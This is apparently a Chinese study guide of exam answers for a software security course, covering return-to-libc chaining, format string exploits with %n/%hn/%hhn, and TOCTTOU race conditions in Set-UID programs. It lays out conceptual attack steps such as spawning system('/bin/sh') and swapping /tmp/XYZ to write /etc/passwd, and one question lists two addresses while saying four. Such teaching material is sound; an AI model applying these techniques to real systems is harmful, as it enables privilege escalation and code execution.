看 PPT 中 **“链式函数调用（不带参数）”** 和 **“链式调用带参数的函数”**。

-复习重点：
无参数函数可以直接用返回地址串起来；带参数函数要在它的返回地址后面放参数。

## S5.10

10. `foo()` 有 buffer overflow。我们想让它返回到库函数 `xyz(0)`。不能跳过 `xyz()` 的函数 prologue，也不能在输入中放 0。有另一个库函数 `setzero(addr)`，它可以把地址 `addr` 处的 4 字节设置为 0。请描述如何构造输入。`xyz(0)` 返回后程序崩溃也无所谓。请画出栈图。

-答案：
先调用 `setzero(addr)`，把栈上某个非零占位值改成 0；然后让 `setzero()` 返回到 `xyz()`，使 `xyz()` 把这个被改成 0 的位置当成参数。

-详细解释：
因为不能在输入中直接放：

```text
0x00000000
```

所以我们先放一个非零占位值，例如：

```text
0xFFFFFFFF
```

然后调用：

```c
setzero(&placeholder);
```

让它在运行时把这个占位值改成 0。

栈布局可以是：

```text
低地址
│
│  buffer 填充
│
│  saved EBP
│
│  setzero() 地址              ← foo 返回后先执行 setzero
│
│  xyz() 地址                  ← setzero 返回后跳到 xyz
│
│  &ARG                        ← setzero 的参数：要清零的位置
│
│  ARG = 0xFFFFFFFF            ← 之后会被 setzero 改成 0
│
高地址
```

执行过程：

```text
1. foo return → setzero()
2. setzero 的参数是 &ARG
3. setzero 把 ARG 从 0xFFFFFFFF 改成 0
4. setzero return → xyz()
5. xyz 把 ARG 所在位置当成自己的参数
6. 因为 ARG 已经变成 0，所以执行 xyz(0)
```

为什么 `xyz()` 可以把 ARG 当成参数？

当 `setzero()` 返回到 `xyz()` 时，栈的位置刚好让 `xyz()` 的参数区域落在 `ARG` 这个 word 上。

题目说 `xyz(0)` 返回后程序是否崩溃无所谓，所以不需要给 `xyz()` 准备一个漂亮的返回地址。

-PPT对应位置：
看 PPT 中 **“链式函数调用，有含零参数的特殊处理”**。

-复习重点：
不能直接放 0 时，可以先放非零值，再调用函数在运行时把它改成 0。

## S5.11

11. 在 S5.10 的基础上，现在想执行函数序列：

```text
xyz(0x11111111) → xyz(0) → xyz(0x22222222)
```

不能跳过 `xyz()` 的函数 prologue，也不能在输入中放 0。有函数 `setzero(addr)` 可以把地址 `addr` 处的 4 字节设置为 0。请描述如何构造输入。最后程序是否崩溃无所谓。请画出栈图。

-答案：
可以用 `leave; ret` gadget 构造多个伪造栈帧。第一帧调用 `xyz(0x11111111)`，第二帧调用 `setzero(&ARG2)`，第三帧调用 `xyz(ARG2)`，其中 `ARG2` 已经被改成 0，第四帧调用 `xyz(0x22222222)`。

-详细解释：
这题比 S5.10 难，因为我们要连续调用多个带参数的函数。

如果直接把多个函数地址排在一起，参数会干扰下一次调用。所以需要用 `leave; ret` 做栈迁移，给每次函数调用准备一个独立的假栈帧。

设：

```text
LR = leave; ret gadget 的地址
F2 = 第二个假栈帧地址
F3 = 第三个假栈帧地址
F4 = 第四个假栈帧地址
ARG2 = 第三个假栈帧中作为 xyz 第二次调用参数的位置
```

整体布局可以这样理解：

```text
第一段：直接从 foo 返回到第一个 xyz

低地址
│
│  buffer 填充
│
│  saved EBP = F2
│
│  xyz() 地址
│
│  LR
│
│  0x11111111
│
高地址
```

这会执行：

```text
xyz(0x11111111)
```

`xyz()` 返回后跳到 `LR`，`LR` 使用 `saved EBP = F2` 迁移到第二个假栈帧。

第二个假栈帧用于执行：

```text
setzero(&ARG2)
```

布局：

```text
F2:
│
│  F3
│  setzero() 地址
│  LR
│  &ARG2
```

含义是：

```text
setzero(&ARG2)
```

它会把 `ARG2` 那个位置的内容改成 0。然后通过 `LR` 迁移到 F3。

第三个假栈帧用于执行：

```text
xyz(0)
```

布局：

```text
F3:
│
│  F4
│  xyz() 地址
│  LR
│  ARG2 = 0xFFFFFFFF      ← 输入中先放非零值，运行时被 setzero 改成 0
```

执行到这里时，`setzero()` 已经把 `ARG2` 改成：

```text
0x00000000
```

所以第三帧实际执行的是：

```text
xyz(0)
```

然后通过 `LR` 迁移到 F4。

第四个假栈帧用于执行：

```text
xyz(0x22222222)
```

布局：

```text
F4:
│
│  dummy EBP
│  xyz() 地址
│  dummy return address
│  0x22222222
```

最后一次 `xyz()` 执行完后，程序是否崩溃题目说不关心，所以 `dummy return address` 可以是任意非零值。

完整逻辑是：

```text
foo return
  → xyz(0x11111111)
  → leave; ret
  → setzero(&ARG2)
  → leave; ret
  → xyz(ARG2)

此时 ARG2 已经被 setzero 改成 0

  → leave; ret
  → xyz(0x22222222)
```

-PPT对应位置：
看 PPT 中 **“链式调用带参数的函数：使用 leave 和 ret”**，以及 **“链式函数调用，有含零参数的特殊处理”**。

-复习重点：
这题有两个核心：

```text
1. 多个带参数函数不能简单连续摆地址，需要用 fake frame / leave; ret。
2. 输入里不能放 0，就先放非零占位值，再用 setzero(addr) 在运行时改成 0。
```

## S6.1

1. 请写一个函数，它接收数量可变的字符串参数，并打印出它们的总长度。

-答案：

```c
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

void print_total_length(int n, ...)
{
    va_list ap;
    int total = 0;

    va_start(ap, n);

    for (int i = 0; i < n; i++) {
        char *s = va_arg(ap, char *);
        if (s != NULL) {
            total += strlen(s);
        }
    }

    va_end(ap);

    printf("Total length = %d\n", total);
}
```

调用示例：

```c
print_total_length(3, "hello", "abc", "seed");
```

-详细解释：
这个函数使用了 C 语言的可变参数机制。

关键点是：

```text
va_list ap        用来遍历可变参数
va_start(ap, n)   初始化参数指针
va_arg(ap, char*) 取出下一个字符串参数
va_end(ap)        清理
```

第一个参数 `n` 用来告诉函数后面有几个字符串。否则函数不知道什么时候停止读取参数。

-PPT对应位置：
看 PPT 中 **“访问可选参数”**、**“va_list / va_start / va_arg / va_end”** 部分。

-复习重点：
可变参数函数必须有办法知道参数数量，例如传入 `n`，或者用 `NULL` 作为结束标记。

## S6.2

2. 缓冲区溢出和格式字符串漏洞都可以修改返回地址字段，但两种攻击修改返回地址的方式不同。请描述它们的区别，并评论哪一种限制更少。

-答案：
缓冲区溢出是通过连续越界写，从 buffer 一路覆盖到返回地址；格式字符串漏洞是利用 `%n` 直接向指定地址写入数据。因此格式字符串漏洞通常限制更少。

-详细解释：
缓冲区溢出攻击中，攻击者需要让输入超过 buffer 大小：

```text
buffer → saved EBP → return address
```

也就是说，它通常依赖目标地址和 buffer 在内存中相邻，或者至少可以通过连续写覆盖到目标位置。

格式字符串攻击不同。攻击者可以利用：

```text
%n
```

把“目前 printf 已经打印的字符数量”写入某个地址。只要攻击者能让目标地址出现在 `printf()` 的参数读取路径中，就可以直接写那个地址。

所以：

```text
Buffer overflow:
    通过连续溢出覆盖目标。

Format string:
    通过 %n 定点写目标地址。
```

格式字符串攻击更灵活，因为它不要求从 buffer 到返回地址之间连续可写。

-PPT对应位置：
看 PPT 中 **“攻击3：更改内存中的数据”** 和 **“攻击5：注入恶意代码”**。

-复习重点：
缓冲区溢出是“撞过去”；格式字符串是“指定地址写”。

## S6.3

3. 我们能否使用 StackGuard 的思想防御格式字符串攻击？

-答案：
不能很好地防御。

-详细解释：
StackGuard 的核心是 canary。它通常放在局部变量和返回地址之间：

```text
buffer
canary
saved EBP
return address
```

如果缓冲区溢出想覆盖返回地址，通常必须先破坏 canary。函数返回前检查 canary，如果发现被改，就终止程序。

但是格式字符串漏洞可以用 `%n` 直接写目标地址，例如直接写返回地址位置。它不需要从 buffer 一路覆盖过去，因此可能不会碰到 canary。

所以 StackGuard 对普通栈溢出有效，但对格式字符串漏洞效果有限。

-PPT对应位置：
看 PPT 中 **“应对措施”** 部分，课件中也指出 StackGuard 对格式字符串漏洞并不有效。

-复习重点：
StackGuard 防的是连续覆盖；格式字符串漏洞可以直接写目标地址。

## S6.4

4. 执行 `printf(fmt)` 时，栈中从低地址到高地址有下面这些 4 字节值。第一个数是变量 `fmt` 的内容，它指向格式字符串。如果你能决定格式字符串内容，最少用多少个格式说明符可以 100% 让程序崩溃？

```text
0xAABBCCDD, 0xAABBDDFF, 0x22334455, 0x00000000, 0x99663322
```

-答案：
最少需要 **3 个格式说明符**，例如：

```text
%x%x%s
```

-详细解释：
`printf(fmt)` 中，`fmt` 是第一个参数。可变参数指针会从 `fmt` 后面的栈位置开始取值。

也就是说，可变参数依次是：

```text
第 1 个可变参数：0xAABBDDFF
第 2 个可变参数：0x22334455
第 3 个可变参数：0x00000000
第 4 个可变参数：0x99663322
```

`%x` 会把参数当整数打印，不一定崩溃。

`%s` 会把参数当作地址，然后从该地址读取字符串。

如果我们使用：

```text
%x%x%s
```

前两个 `%x` 会跳过：

```text
0xAABBDDFF
0x22334455
```

第三个 `%s` 会把：

```text
0x00000000
```

当作字符串地址读取。

地址 `0x00000000` 是 NULL 地址，访问它会导致程序崩溃。因此 3 个格式说明符可以 100% 崩溃。

-PPT对应位置：
看 PPT 中 **“攻击1：崩溃程序”** 和 **“缺少可选参数”**。

-复习重点：
`%s` 会把参数当地址。让 `%s` 读 NULL 地址，可以稳定导致崩溃。

## S6.5

5. 服务器程序接收远程用户输入，把输入保存在栈上的 buffer 中，即图 1 的 Region ②。buffer 地址保存在局部变量 `fmt` 中，然后程序执行 `printf(fmt)`。图 1 中给出了当前栈布局。请构造输入，使服务器执行你的代码。

-答案：
构造思路是：把恶意代码放在 Region ② 中，然后利用 `%n` 把返回地址改成恶意代码的地址。

一种概念性布局如下：

```text
Region ② 中的用户输入：

[返回地址字段的地址 0xAABBCDA6]
[格式字符串控制内容：若干 %x / 宽度控制 / %n]
[NOP sled]
[malicious code]
```

目标是让 `%n` 执行：

```text
*(0xAABBCDA6) = malicious_code_address
```

其中：

```text
0xAABBCDA6 是返回地址字段所在位置
malicious_code_address 是 Region ② 中恶意代码的地址
```

-详细解释：
格式字符串漏洞利用的关键是 `%n`。

`%n` 会把目前为止已经打印的字符数写入一个地址。这个地址来自 `printf()` 认为的下一个参数。

题目图中，Region ② 是用户可控区域，`fmt` 指向 Region ② 的开始地址。`printf(fmt)` 会把 Region ② 当作格式字符串解析。

攻击者需要做三件事：

```text
1. 把返回地址字段的位置 0xAABBCDA6 放进用户输入中。
2. 用若干 %x 让 printf 的 va_list 指针移动到这个地址。
3. 用 %n 把恶意代码地址写入 0xAABBCDA6。
```

这样当当前函数返回时，它会从返回地址字段取值。原本那里应该是正常返回地址，现在被改成了恶意代码地址，因此程序跳到 Region ② 中的 malicious code。

-PPT对应位置：
看 PPT 中 **“攻击3：更改内存中的数据”** 和 **“攻击5：注入恶意代码”**。PDF 图 1 展示了 Region ②、`fmt` 和返回地址之间的位置关系。

-复习重点：
这题核心不是 buffer overflow，而是：

```text
用 %n 修改返回地址。
```

## S6.6

6. 如果 S6.5 的答案需要服务器打印超过十亿个字符，攻击会很慢。请修改答案，使打印字符总数小于 80,000。

-答案：
使用 `%hn` 分两次写，每次只写 2 字节，而不是用 `%n` 一次写完整 4 字节地址。

-详细解释：
假设我们要把返回地址改成恶意代码地址：

```text
0xAABBCCDD
```

一次用 `%n` 写入，就需要让 `printf()` 已经打印出：

```text
0xAABBCCDD
```

这么多个字符，这个数非常大。

所以可以拆成两半：

```text
高 2 字节：0xAABB
低 2 字节：0xCCDD
```

返回地址字段从：

```text
0xAABBCDA6
```

开始。

因为小端机器中低 2 字节放在低地址，高 2 字节放在高地址，所以要写：

```text
0xAABBCDA6     写入 0xCCDD
0xAABBCDA8     写入 0xAABB
```

为了让打印字符数单调增加，可以先写较小的：

```text
0xAABB
```

到：

```text
0xAABBCDA8
```

再继续打印一些字符，使总数达到：

```text
0xCCDD
```

然后写低 2 字节到：

```text
0xAABBCDA6
```

因为：

```text
0xAABB = 43707
0xCCDD = 52445
```

总打印字符数只需要到 52,445，小于 80,000。

-PPT对应位置：
看 PPT 中 **“攻击方式 4：更快捷的进攻方式”**，里面讲了 `%hn` 每次写 2 字节。

-复习重点：
`%n` 写 4 字节；`%hn` 写 2 字节。
为了避免打印超大量字符，通常拆成两次 `%hn` 写入。

## S6.7

7. 基于 S6.5，如果图 1 中 Region ② 和 Region ③ 的距离不是 28 字节，而是 26 字节。这个数不能被 4 整除，但每个 `%x` 都会让格式字符串指针前进 4 字节。请构造格式字符串。

-答案：
可以在用户输入开头加入 2 个填充字节，使后面的目标地址重新按 4 字节对齐。

-详细解释：
原来距离是 28 字节：

```text
28 / 4 = 7
```

所以可以用 7 个 `%x` 让 `printf()` 的参数指针移动到用户控制区域。

现在距离变成 26 字节，不能被 4 整除：

```text
26 / 4 不是整数
```

而每个 `%x` 都会让 va_list 前进 4 字节。这样指针可能永远无法刚好落在我们想让它读取的地址开头。

解决办法是在 Region ② 的开头放 2 个无用字节：

```text
[2 字节 padding][目标地址][格式字符串控制内容]
```

这样目标地址相对于 va_list 的距离变成：

```text
26 + 2 = 28
```

又可以被 4 整除。

概念布局：

```text
offset 0 - 1:
    padding，例如 "AA"

offset 2 - 5:
    返回地址字段地址，例如 0xAABBCDA6

后面：
    若干 %x
    宽度控制
    %n 或 %hn
```

-PPT对应位置：
看 PPT 中 **“攻击3：更改内存中的数据”** 和 **“利用格式字符串移动 va_list 指针”**。

-复习重点：
当目标地址和 va_list 不对齐时，可以加 padding 调整对齐。

## S6.8

8. 基于 S6.5。现在不知道返回地址确切存在哪里，只知道它可能在下面四个地址之一：

```text
0xAABBCDA4
0xAABBCDA8
```

可以使用 `%hn` 分半写。假设恶意代码地址是：

```text
0xAABBCCDD
```

拆成：

```text
高 2 字节：0xAABB
低 2 字节：0xCCDD
```

```text
高 2 字节写入：
0xAABBCDA2
0xAABBCDA6
0xAABBCDAA
0xAABBCDAE

低 2 字节写入：
0xAABBCDA0
0xAABBCDA4
0xAABBCDA8
0xAABBCDAC
```

-详细解释：
返回地址可能是四个位置之一。我们不知道哪一个是真的，所以最稳的方法是全部覆盖。

因为小端序中：

```text
返回地址低 2 字节在 addr
返回地址高 2 字节在 addr + 2
```

所以对每个候选地址 `addr`，要写：

```text
addr     = 0xCCDD
addr + 2 = 0xAABB
```

为了让打印字符数小于 80,000，可以这样安排：

```text
先打印到 0xAABB，连续用 4 个 %hn 写四个高 2 字节。
再继续打印到 0xCCDD，连续用 4 个 %hn 写四个低 2 字节。
```

因为：

```text
0xAABB = 43707
0xCCDD = 52445
```

最大打印字符数是 52,445，小于 80,000。

最短格式字符串的思想是：

```text
1. 先在输入开头放 8 个目标半字地址。
2. 用最少的 %x 把 va_list 移到这些地址。
3. 打印到 0xAABB 后连续使用 %hn%hn%hn%hn。
4. 再打印到 0xCCDD 后连续使用 %hn%hn%hn%hn。
```

也就是尽量避免重复 padding，连续写多个相同半字值。

-PPT对应位置：
看 PPT 中 **“攻击方式 4：更快捷的进攻方式”** 和 **“攻击5：注入恶意代码”**。

-复习重点：
不知道哪个返回地址是真的，就把所有候选返回地址都覆盖。
最短格式字符串的关键是：同一个数值只打印一次，然后用多个 `%hn` 连续写多个地址。

## S6.9

9. 编译器如果检测到 `printf()` 的参数数量和格式说明符数量不匹配，可以给出警告。请评论这种防御的局限性。

-答案：
这种防御有用，但不完整。它只能发现一部分静态可见的问题，不能可靠检测运行时由用户控制的格式字符串。

-详细解释：
如果代码是：

```c
printf("%d %d", x);
```

编译器可以发现格式字符串中有两个 `%d`，但只提供了一个参数，于是给出警告。

但如果代码是：

```c
printf(user_input);
```

编译器通常无法知道 `user_input` 运行时包含什么。用户可能输入：

```text
%x%x%n
```

这只有程序运行时才知道。

此外，很多项目会忽略 warning，或者没有使用足够严格的编译选项。

所以编译器警告只能辅助发现问题，不能代替正确写法。

正确写法是：

```c
printf("%s", user_input);
```

-PPT对应位置：
看 PPT 中 **“应对措施：编译器”**。

-复习重点：
编译器能发现静态格式字符串错误，但难以判断动态用户输入中的格式说明符。

## S6.10

10. 因为 `printf()` 不需要特权，我们可以在执行它之前临时关闭程序特权。这样即使格式字符串漏洞被利用，攻击者也不能获得太多权限。请评论这个想法。

-答案：
这是一个有用的缓解思路，符合最小权限原则，但不能完全解决问题。

-详细解释：
如果程序是 Set-UID root 程序，在执行危险代码前临时降低权限，可以减少攻击者直接获得 root 权限的风险。

例如：

```text
执行 printf() 前：
    EUID 从 root 降到普通用户

执行 printf() 后：
    再恢复 root 权限
```

但是这个方法仍然有风险。

原因是格式字符串漏洞可以修改内存，例如：

```text
1. 修改返回地址
2. 修改函数指针
3. 修改控制变量
4. 修改后续恢复权限的逻辑
```

如果程序只是“临时降权”，但之后还会恢复 root 权限，攻击者可能利用格式字符串漏洞篡改后续执行流，让程序在恢复权限后执行攻击者想要的代码。

更安全的做法是：

```text
如果后续不再需要特权，就永久放弃特权。
```

-PPT对应位置：
看 PPT 中 **“应对措施”** 和前面 Set-UID 章节中的 **“最小特权原则”**。

-复习重点：
临时降权可以降低风险，但不能代替修复漏洞。格式字符串漏洞本身仍然必须修。

## S6.11

11. 如果把栈设置为不可执行，还能利用格式字符串漏洞让受害程序生成 shell 吗？

-答案：
可以。不可执行栈只能阻止执行栈上的 shellcode，但攻击者仍然可以使用 return-to-libc 或 ROP。

-详细解释：
不可执行栈防的是：

```text
把 shellcode 放在栈上，然后跳到栈上执行。
```

但是格式字符串漏洞可以修改返回地址。攻击者不一定要让程序跳到栈上的 shellcode。

攻击者可以把返回地址改成：

```text
system()
```

然后构造：

```text
system("/bin/sh")
```

这就是 return-to-libc 攻击。

因为 `system()` 在 libc 代码段中，本来就是可执行的，所以不可执行栈无法阻止。

-PPT对应位置：
看 PPT 中 **“应对措施”**，以及上一章 S05 的 **“Return-to-libc”**。

-复习重点：
NX 只能防“执行栈上代码”；不能防“跳到已有代码”。

## S6.12

12. 我们准备使用 return-to-libc 技术利用格式字符串漏洞。请详细描述需要修改栈的哪部分，以及如何通过格式字符串漏洞实现。请使用图 1 来说明。

-答案：
需要修改栈上的返回地址及其后面的参数区域，把当前函数返回后的执行流伪造成：

```text
system("/bin/sh") → exit()
```

需要修改：

```text
Return Address        改成 system() 的地址
Return Address + 4    改成 exit() 的地址
Return Address + 8    改成 "/bin/sh" 字符串地址
```

-详细解释：
图 1 中 Region ① 是返回地址区域。格式字符串漏洞允许我们用 `%n` 或 `%hn` 写指定地址。

所以攻击步骤是：

```text
1. 在 Region ② 的用户输入中放入目标地址：
   Return Address
   Return Address + 4
   Return Address + 8

2. 使用 %x 移动 va_list，使 printf 读取到这些地址。

3. 使用 %n 或 %hn 分别写入：
   system() 地址
   exit() 地址
   "/bin/sh" 地址

4. 当前函数返回时，程序跳到 system()。
```

修改后栈的概念布局变成：

```text
高地址
│
│  "/bin/sh" 地址          ← system() 的参数
│
│  exit() 地址             ← system() 返回后跳到 exit
│
│  system() 地址           ← 原 Return Address 被改成这里
│
低地址
```

这样即使栈不可执行，也能通过 libc 中已有的 `system()` 函数启动 shell。

-PPT对应位置：
看 S06 PPT 中 **“攻击5：注入恶意代码”**，以及 S05 PPT 中 **“Return-to-libc 攻击”**。

-复习重点：
格式字符串漏洞负责“写内存”；return-to-libc 负责“复用已有函数”。二者结合可以绕过不可执行栈。

## S6.13

13. 如果我们想用格式字符串漏洞向目标地址写入一个小数，例如 0，但由于前面必须放一些 `%x`，在 va_list 指针到达目标地址之前，`printf()` 已经打印了一些字符。是否仍然可以把 0 写入目标地址？

-答案：
可以。可以使用 `%hhn` 或 `%hn`，利用截断和取模效果写入 0。

-详细解释：
普通 `%n` 会写入完整的“已打印字符数”。如果已经打印了字符，就不能直接让这个数变回 0。

但是：

```text
%hn   只写低 2 字节
%hhn  只写低 1 字节
```

所以可以利用取模效果。

例如 `%hhn` 只写 1 字节。如果目前已经打印了 250 个字符，再打印 6 个字符，总数变成：

```text
256
```

而 256 的低 1 字节是：

```text
0x00
```

所以 `%hhn` 会向目标字节写入 0。

如果要写 4 字节的 0，可以对目标地址的 4 个字节分别使用 `%hhn`：

```text
addr
addr + 1
addr + 2
addr + 3
```

让每次写入时打印字符数的低 8 位都是 0。

也可以用 `%hn` 按 2 字节写，使打印字符数达到 65536 的倍数。

-PPT对应位置：
看 PPT 中 **“攻击方式 4：更快捷的进攻方式”**，其中讲了 `%hn` 和 `%hhn`。

-复习重点：
虽然总打印字符数不能减少，但 `%hhn/%hn` 只写低字节或低半字，可以通过取模写出 0。

### S06 总复习重点

-答案：
这一章主要掌握：`printf(user_input)` 会让用户输入变成格式控制指令，从而读栈、写内存、修改返回地址。

-详细解释：

```text
1. 正确写法是 printf("%s", user_input)。
2. 危险写法是 printf(user_input)。
3. %x 可以读取栈上的值。
4. %s 会把参数当地址读取字符串，可能崩溃。
5. %n 可以把已打印字符数写入目标地址。
6. %hn 写 2 字节，%hhn 写 1 字节。
7. 格式字符串漏洞可以直接修改返回地址。
8. 它不一定会破坏 canary，所以 StackGuard 不可靠。
9. 不可执行栈不能彻底防御，因为可以结合 return-to-libc。
10. 如果目标地址不对齐，可以用 padding 调整。
11. 如果不知道哪个返回地址是真的，可以覆盖多个候选地址。
```

重点看 S06 PPT 的：

```text
访问可选参数
printf() 的工作方式
缺少可选参数
攻击1：崩溃程序
攻击2：打印栈数据
攻击3：更改内存中的数据
攻击4：写入指定值
攻击5：注入恶意代码
%hn / %hhn
应对措施
```

-复习重点：
最核心一句话：

```text
格式字符串漏洞的本质是：
用户输入不该控制 printf 的格式字符串；
一旦控制了，就能让 printf 帮攻击者读内存、写内存、甚至修改返回地址。
```

## S7.1

1. 下面这个 Set-UID 程序是否存在竞态条件漏洞？

```c
if (!access("/etc/passwd", W_OK)) {
    /* the real user has the write permission */
    f = open("/tmp/X", O_WRITE);
    write_to_file(f);
}
else {
    /* the real user does not have the write permission */
    fprintf(stderr, "Permission denied\n");
}
```

-答案：
一般不存在题目所讨论的典型 TOCTTOU 竞态条件漏洞。

-详细解释：
典型竞态条件漏洞通常是：

```c
access("/tmp/X", W_OK);
open("/tmp/X", O_WRITE);
```

也就是 **检查和使用的是同一个文件名**。攻击者可以在 `access()` 和 `open()` 之间把 `/tmp/X` 换成符号链接。

但这题里：

```c
access("/etc/passwd", W_OK);
open("/tmp/X", O_WRITE);
```

检查的是 `/etc/passwd`，使用的是 `/tmp/X`，二者不是同一个对象。

对于普通用户运行的 Set-UID 程序来说，`access("/etc/passwd", W_OK)` 检查的是真实用户 ID，也就是普通用户是否能写 `/etc/passwd`。普通用户通常不能写，所以检查失败，程序不会继续打开 `/tmp/X`。

因此这里不是典型的“检查 `/tmp/X`，使用 `/tmp/X`，中间被替换”的竞态条件漏洞。

-PPT对应位置：
看 PPT 中 **“一种典型的竞态条件：TOCTTOU”** 和 **“竞态条件漏洞”**。

-复习重点：
TOCTTOU 的关键是：**check 和 use 必须针对同一个资源，且中间可以被替换**。

## S7.2

2. 假设我们开发一个新的系统调用 `faccess(int fd, int mode)`，它和 `access()` 类似，但检查对象不是文件名，而是文件描述符 `fd`。下面程序是否存在竞态条件问题？

```c
int f = open("/tmp/x", O_WRITE);

if (!faccess(f, W_OK)) {
    write_to_file(f)
} else {
    close(f);
}
```

-答案：
不存在典型竞态条件问题。

-详细解释：
这段程序先打开文件，得到文件描述符：

```c
int f = open("/tmp/x", O_WRITE);
```

之后 `faccess(f, W_OK)` 检查的是这个已经打开的文件描述符，而不是再次通过文件名 `/tmp/x` 查找文件。

关键区别是：

```text
access("/tmp/x") 通过文件名检查，文件名可能被替换。
faccess(f)       通过已打开的 fd 检查，fd 指向的文件已经固定。
```

一旦文件被 `open()` 打开，`f` 指向的就是那个具体文件对象。攻击者即使之后把 `/tmp/x` 改成符号链接或换成别的文件，也不会改变已经打开的文件描述符 `f` 指向的对象。

所以这里没有典型的 TOCTTOU 漏洞。

-PPT对应位置：
看 PPT 中 **“stat() / fstat() 区别”** 和 **“原子操作”** 的思想。

-复习重点：
基于文件名检查容易出 race condition；基于文件描述符检查更安全。

## S7.3

3. 攻击者需要赢多少次竞态条件，才能利用下面程序？

```c
int main()
{
    struct stat stat1, stat2;
    int fd1, fd2;

    if (access("/tmp/XYZ", O_RDWR)) {
        fprintf(stderr, "Permission denied\n");
        return -1;
    }
    else fd1 = open("/tmp/XYZ", O_RDWR);

    if (access("/tmp/XYZ", O_RDWR)) {
        fprintf(stderr, "Permission denied\n");
        return -1;
    }
    else fd2 = open("/tmp/XYZ", O_RDWR);

    /*
      The program then checks whether fd1 and fd2 refer to
      the same file, if so, the program will write to
      fd1 or fd2. Otherwise, the program will do nothing
      and exit.
    */
}
```

-答案：
攻击者需要赢 **两次竞态条件**。

-详细解释：
程序有两组：

```c
access("/tmp/XYZ", O_RDWR);
open("/tmp/XYZ", O_RDWR);
```

攻击者想让程序最终打开受保护文件，例如 `/etc/passwd`。但 `access()` 检查真实用户权限，普通用户不能通过 `/etc/passwd` 的检查。

所以攻击者要做：

```text
第一次：
access() 时，让 /tmp/XYZ 指向普通用户可访问文件。
open() 时，让 /tmp/XYZ 指向 /etc/passwd。

第二次：
access() 时，再让 /tmp/XYZ 指向普通用户可访问文件。
open() 时，再让 /tmp/XYZ 指向 /etc/passwd。
```

这样：

```text
fd1 打开的是 /etc/passwd
fd2 打开的也是 /etc/passwd
```

后面程序检查 `fd1` 和 `fd2` 是否指向同一个文件，也会通过。

所以攻击者必须在两个 `access()` 和 `open()` 之间都成功切换目标文件，也就是要赢两次 race。

-PPT对应位置：
看 PPT 中 **“反复执行 access() 和 open() 函数”**，课件讲了多次检查会增加攻击难度。

-复习重点：
每一组 `access()` → `open()` 都是一个 race window。这里有两组，所以要赢两次。

## S7.4

4. `open()` 系统调用内部也会先检查用户是否有权限访问目标文件，然后再真正打开文件。这看起来也是 check-and-use 模式。它是否存在竞态条件问题？

-答案：
一般没有用户态程序中那种可利用的 TOCTTOU 问题。

-详细解释：
`open()` 是一个系统调用。虽然内核内部确实会做权限检查和打开文件，但对用户态攻击者来说，整个 `open()` 是一个原子操作。

攻击者不能在 `open()` 系统调用内部的“检查权限”和“打开文件”之间插入操作。

而竞态条件漏洞通常发生在用户程序自己写了两步：

```c
access("/tmp/XYZ", W_OK);
open("/tmp/XYZ", O_WRITE);
```

这两个是独立系统调用，中间程序回到用户态，攻击者有机会替换文件。

所以：

```text
open() 内部 check + use：
    内核中完成，外部攻击者不能插入。

access() + open()：
    两个独立调用，中间有攻击窗口。
```

-PPT对应位置：
看 PPT 中 **“原子操作”** 部分。

-复习重点：
危险的是用户程序把检查和使用拆成两个系统调用；单个 `open()` 调用通常是原子的。

## S7.5

5. 最小权限原则可以有效防御本章讨论的竞态条件攻击。能否用同样原则防御缓冲区溢出攻击？具体来说，在执行易受攻击函数之前禁用 root 权限，函数返回后再恢复 root 权限。为什么？

-答案：
这种方法不能可靠防御缓冲区溢出攻击。它只能降低风险，但不能从根本上阻止攻击。

-详细解释：
对竞态条件来说，最小权限原则很有效。比如在 `open()` 文件前把 EUID 降成普通用户，即使攻击者把 `/tmp/XYZ` 换成 `/etc/passwd`，也打不开。

但缓冲区溢出不同。缓冲区溢出攻击的本质是控制程序执行流。

如果程序只是临时禁用 root 权限，例如：

```text
进入 vulnerable_function 前：seteuid(getuid())
vulnerable_function 返回后：seteuid(0)
```

问题是：
攻击者通过缓冲区溢出后，不一定按原程序流程执行。他可以：

```text
1. 覆盖返回地址，跳到 seteuid(0)
2. 重新恢复 root 权限
3. 再跳到 system("/bin/sh")
```

因为“临时降权”通常保留了 saved UID，程序以后仍然可以恢复 root 权限。攻击者一旦控制执行流，也可能调用恢复权限的代码。

所以：

```text
临时降权可以减少风险，但不能可靠防御 buffer overflow。
永久放弃权限更安全，但程序之后就不能再恢复 root 权限。
```

-PPT对应位置：
看 PPT 中 **“最小特权原则”** 以及 S04 PPT 中 **“缓冲区溢出的后果”**。

-复习重点：
竞态条件攻击主要滥用权限执行文件操作；缓冲区溢出攻击会劫持控制流，所以临时降权不一定够。

## S7.6

6. 下面 root-owned Set-UID 程序需要写一个文件，但它想确保该文件属于真实用户。它用 `stat()` 获取文件所有者 ID，并和进程真实用户 ID 比较。如果不匹配就退出。这个程序是否有竞态条件？如果有，如何利用？

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int main()
{
    struct stat statbuf;
    uid_t real_uid;
    FILE* fp;

    fp = fopen("/tmp/XYZ", "a+");
    stat("/tmp/XYZ", &statbuf);

    printf("The file owner's user ID: %d\n", statbuf.st_uid);
    printf("The process's real user ID: %d\n", getuid());

    // Check whether the file belongs to the user
    if (statbuf.st_uid == getuid()) {
        printf("IDs match, continue to write to the file.\n");
        // write to the file ...
        if (fp) fclose(fp);
    } else {
        printf("IDs do not match, exit.\n");
        if (fp) fclose(fp);
        return -1;
    }

    return 0;
}
```

-答案：
有竞态条件漏洞。

-详细解释：
关键问题是：

```c
fp = fopen("/tmp/XYZ", "a+");
stat("/tmp/XYZ", &statbuf);
```

程序先用 root 权限打开 `/tmp/XYZ`，然后再用 `stat()` 通过文件名检查 `/tmp/XYZ` 的 owner。

但是 `fopen()` 和 `stat()` 使用的是同一个文件名，但它们之间有时间窗口。攻击者可以在这个窗口中替换 `/tmp/XYZ`。

攻击方式：

```text
1. 在 fopen() 之前，让 /tmp/XYZ 指向受保护文件，比如 /etc/passwd。
   由于程序 EUID 是 root，fopen() 可以打开 /etc/passwd。

2. fopen() 返回后，fp 已经指向 /etc/passwd。

3. 在 stat() 之前，攻击者把 /tmp/XYZ 换成自己拥有的普通文件。

4. stat("/tmp/XYZ") 看到的是攻击者自己的文件，所以 st_uid == getuid()，检查通过。

5. 程序后面写入的是 fp，而 fp 仍然指向第一步打开的 /etc/passwd。
```

所以程序检查的是攻击者自己的文件，但实际写的是受保护文件。

-PPT对应位置：
看 PPT 中 **“竞态条件漏洞”**、**“攻击步骤”**、**“stat() 与文件名检查”**。

-复习重点：
`stat(filename)` 检查的是“当前文件名指向的对象”；但 `fp` 指向的是之前打开的对象。两者可能已经不是同一个文件。

## S7.7

